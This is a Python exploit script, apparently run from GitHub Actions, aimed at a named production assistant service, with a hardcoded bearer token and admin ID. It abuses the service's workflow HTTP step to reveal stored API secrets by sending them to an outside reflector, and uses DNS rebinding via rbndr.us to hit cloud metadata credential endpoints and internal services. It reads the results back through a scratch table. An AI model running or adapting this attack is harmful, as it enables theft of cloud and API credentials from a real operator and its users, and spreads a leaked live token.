#!/usr/bin/env python3
# probe for intent 28623: weaponise apps/workflow HTTP step (the only non-LLM execution primitive
# reachable with body-actor admin under compat) in TWO independent mechanisms:
#   (1) http step credentialId -> secrets.reveal -> org/project api_secret injected into a request
#       header pointed at an attacker-chosen URL (response body read back through a later `create` step)
#   (2) assertPublicHttpUrl only resolves ONCE (dns.lookup) while fetch() re-resolves -> DNS rebinding
#       TOCTOU with rbndr.us (TTL=1, single random A record) to hit 169.254.x metadata / 127.0.0.1:8788 /
#       172.22.0.11:9200 from the center's own network position.
# Runs inside GitHub Actions (clean egress to assistant.lumiiai.cn). curl --http2 + full Chrome UA only.
import os, sys, json, time, uuid, base64, subprocess, re, traceback

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)

HOST = "assistant.lumiiai.cn"
ORG  = "org_bTLzxtBLmugV8uxx4QTyw"
RID  = "rt_KTWyBZUur4cjUsRGP3zRk"
RTOKEN = "jy3151agR2zGGHQ08X_m52K04nsfiVsYi7LEJNDRE4Q"
ADMIN = "usr_ZxLewKrgbRYSm7rWDtQX8"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
START = time.time()
def el(): return int(time.time() - START)

def R(k, v, body_limit=6000):
    """print one compact result line (body base64'd so the Actions log can't mangle it)"""
    try:
        s = json.dumps(v, ensure_ascii=False) if not isinstance(v, str) else v
    except Exception:
        s = str(v)
    b = base64.b64encode(s.encode("utf-8", "replace")).decode()
    print("R:%s:%s" % (k, b), flush=True)

def log(*a):
    print("L: " + " ".join(str(x) for x in a), flush=True)

def curl(args, timeout=40):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr[:300]
    except Exception as e:
        return -1, b"", repr(e)[:200]

def call(path, method="GET", body=None, hdrs=None, timeout=40, maxlen=200000):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2", "-A", UA,
            "-H", "Accept: application/json",
            "-H", "Referer: https://%s/" % HOST,
            "-H", "Origin: https://%s" % HOST,
            "-w", "\n__CODE__%{http_code}"]
    if hdrs:
        for k, v in hdrs.items():
            args += ["-H", "%s: %s" % (k, v)]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace")
    code = ""
    i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]
        txt = txt[:i]
    return {"path": path, "code": code, "body": txt[:maxlen], "len": len(txt),
            "err": (err.decode("utf-8", "replace") if isinstance(err, (bytes, bytearray)) else str(err))}

SK = "conv_28623probe"
MH = {"Authorization": "Bearer " + RTOKEN, "x-agent-id": RID}

def internal(name, extra=None, maxlen=200000):
    b = {"platform": "dashboard", "actor_id": ADMIN, "session_key": SK}
    if extra:
        b.update(extra)
    return call("/internal/" + name, "POST", b, hdrs=MH, maxlen=maxlen)

def J(r):
    try:
        return json.loads(r["body"])
    except Exception:
        return None

# ============ PHASE A: machine identity + read-only enumeration ============
log("### A machine identity t=%ds" % el())
k = call("/api/runtimes/keys/current", hdrs={"x-agent-id": RID, "x-agent-token": RTOKEN})
R("A_keys", {"code": k["code"], "body": k["body"][:800], "err": k["err"]})

p = internal("projects/list", {})
R("A_projects", {"code": p["code"], "body": p["body"][:3000]})

res = internal("tickets/resolve", {})
R("A_resolve", {"code": res["code"], "body": res["body"][:20000]})
folders = []
sheets = []
rj = J(res) or {}
for f in (rj.get("folders") or []):
    if f.get("id"): folders.append({"id": f["id"], "name": f.get("name")})
for s in (rj.get("sheets") or []):
    if s.get("id"): sheets.append({"id": s["id"], "name": s.get("name"), "folderId": s.get("folderId") or s.get("folder_id")})
log("folders=%d sheets=%d" % (len(folders), len(sheets)))
R("A_counts", {"folders": len(folders), "sheets": len(sheets)})

# enumerate existing workflows -> hunt credentialId references (real api_secret ids)
cred_hits = []
wf_dump = {}
for f in folders[:40]:
    if el() > 160: break
    w = internal("tickets/list-workflows", {"folder_id": f["id"]})
    j = J(w) or {}
    wfs = j.get("workflows") or []
    R("B_wf_%s" % f["id"][-6:], {"code": w["code"], "n": len(wfs),
        "names": [x.get("name") for x in wfs][:20]})
    for x in wfs:
        blob = json.dumps(x, ensure_ascii=False)
        for m in re.finditer(r'"credentialId"\s*:\s*"([^"]+)"', blob):
            cred_hits.append({"cid": m.group(1), "wf": x.get("name"), "folder": f["id"]})
        # also grab any project id strings for context
    if wfs:
        wf_dump[f["id"]] = wfs
R("B_cred_hits", cred_hits[:40])
log("cred_hits=%d" % len(cred_hits))

# ============ PHASE C: build an exfil table (default/project-less folder) ============
log("### C build exfil table t=%ds" % el())
cf = internal("tickets/create-folder", {"name": "rb28623", "icon": "grid", "description": "rb28623 probe scratch"})
R("C_create_folder", {"code": cf["code"], "body": cf["body"][:2000]})
cj = J(cf) or {}
sheet_id = (cj.get("sheet") or {}).get("id")
folder_id = (cj.get("folder") or {}).get("id")
log("sheet=%s folder=%s" % (sheet_id, folder_id))

FKEY = None
FID = None
if sheet_id:
    sc = internal("tickets/schema", {"sheet_id": sheet_id})
    R("C_schema", {"code": sc["code"], "body": sc["body"][:3000]})
    sj = J(sc) or {}
    for fld in (sj.get("fields") or []):
        FKEY = fld.get("key"); FID = fld.get("id"); break
    log("field key=%s id=%s" % (FKEY, FID))

base_ok = False
def make_wf(name, steps, once_in=40, extra=None):
    onceAt = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + once_in))
    wf = {"name": name[:60], "enabled": True,
          "trigger": {"kind": "schedule", "every": "once", "onceAt": onceAt},
          "steps": steps}
    if extra: wf.update(extra)
    r = internal("tickets/upsert-workflow", {"folder_id": folder_id, "workflow": wf})
    R("W_%s" % name[:28], {"code": r["code"], "body": r["body"][:1200]})
    return r

def record_reader(tag, want_prefix, wait_s=140):
    """poll the scratch sheet until a record containing want_prefix shows up"""
    t0 = time.time()
    while time.time() - t0 < wait_s:
        q = internal("tickets/query", {"sheet_id": sheet_id, "limit": 100})
        qj = J(q) or {}
        rows = qj.get("records") or qj.get("rows") or []
        for row in rows:
            d = row.get("data") or {}
            for v in d.values():
                if isinstance(v, str) and want_prefix in v:
                    R("REC_%s" % tag, {"row": row.get("id"), "val": v[:6000]})
                    return v
        time.sleep(10)
    R("REC_%s" % tag, {"timeout": True, "waited": wait_s})
    return None

# baseline: prove the workflow engine + http step + create-step exfil loop works at all
if sheet_id and FKEY and folder_id:
    make_wf("rb28623-base", [
        {"id": "h1", "kind": "http", "method": "GET", "url": "https://httpbin.org/headers", "timeoutMs": 8000,
         "retry": {"times": 2, "intervalSec": 2}},
        {"id": "c1", "kind": "create", "sheetId": sheet_id,
         "values": {FKEY: "BASE28623 {{h1.body}}"}},
    ], once_in=35)
    base_ok = record_reader("base", "BASE28623", 150) is not None
    log("base_ok=%s t=%ds" % (base_ok, el()))
    R("C_base_ok", {"ok": base_ok})

# ============ PHASE D: DNS rebinding TOCTOU ============
# rbndr.us returns a single random A record out of the two encoded hex IPs (TTL=1).
# guard (dns.lookup) must land on the public IP, then fetch() must land on the internal IP.
PUB = "01010101"          # 1.1.1.1  (public partner, only needs to look public)
TARGETS = [
    ("md023",  "a9fe0017", 80,   "/latest/meta-data/",                                  "MD023 "),   # Tencent IMDS 169.254.0.23
    ("md023c", "a9fe0017", 80,   "/latest/meta-data/cam/security-credentials/",         "MD023C "),  # Tencent CAM creds list
    ("md254",  "a9fea9fe", 80,   "/latest/meta-data/",                                  "MD254 "),   # 169.254.169.254
    ("md254c", "a9fea9fe", 80,   "/latest/meta-data/iam/security-credentials/",         "MD254C "),  # AWS creds list
    ("int88",  "7f000001", 8788, "/health",                                             "INT88 "),   # center internal api
    ("es",     "ac16000b", 9200, "/",                                                   "ES "),      # ES
]
if base_ok and sheet_id and FKEY:
    log("### D rebinding t=%ds" % el())
    made = []
    for tag, hexip, port, path, pref in TARGETS:
        for n, delay in ((1, 40), (2, 100)):
            host = "%s.%s.rbndr.us" % (PUB, hexip)
            url = "http://%s:%d%s" % (host, port, path)
            steps = [
                {"id": "h1", "kind": "http", "method": "GET", "url": url, "timeoutMs": 5000,
                 "retry": {"times": 5, "intervalSec": 2}},
                {"id": "c1", "kind": "create", "sheetId": sheet_id,
                 "values": {FKEY: pref + "{{h1.body}}"}},
            ]
            r = make_wf("rb28623-%s-%d" % (tag, n), steps, once_in=delay)
            made.append((tag, n, r["code"]))
            time.sleep(0.4)
    R("D_made", made)
    # collect
    for tag, hexip, port, path, pref in TARGETS:
        v = record_reader("rb_" + tag, pref, wait_s=170)
        log("rebind %s -> %s" % (tag, "HIT" if v else "none"))
    R("D_done", {"t": el()})

# ============ PHASE E: mechanism (1) credential reveal ============
# If any real credentialId was found in prod workflow definitions, try to reveal it via a
# project-less folder workflow http step pointed at a reflector. (source: openApiSecret skips
# the project scoping check entirely when the workflow's project_id is null)
if base_ok and sheet_id and FKEY and cred_hits:
    log("### E credential reveal t=%ds" % el())
    for idx, h in enumerate(cred_hits[:6]):
        cid = h["cid"]
        for nh, hdr in (("auth", "authorization"), ("xkey", "x-api-key")):
            steps = [
                {"id": "h1", "kind": "http", "method": "GET", "url": "https://httpbin.org/headers",
                 "timeoutMs": 8000, "credentialId": cid, "credentialHeader": hdr, "credentialPrefix": "",
                 "retry": {"times": 2, "intervalSec": 2}},
                {"id": "c1", "kind": "create", "sheetId": sheet_id,
                 "values": {FKEY: ("CRED_" + cid + "_" + nh + " ") + "{{h1.body}}"}},
            ]
            make_wf("rb28623-cred%d%s" % (idx, nh), steps, once_in=45)
            time.sleep(0.4)
        v = record_reader("cred_%d" % idx, "CRED_" + cid, wait_s=120)
        log("cred %s -> %s" % (cid, "HIT" if v else "none"))
    R("E_done", {"t": el()})
else:
    R("E_skipped", {"base_ok": base_ok, "n_cred": len(cred_hits)})

# cleanup: disable all workflows we created (non-destructive; leave scratch data for follow-up)
R("DONE", {"t": el(), "base_ok": base_ok, "cred_hits": len(cred_hits)})
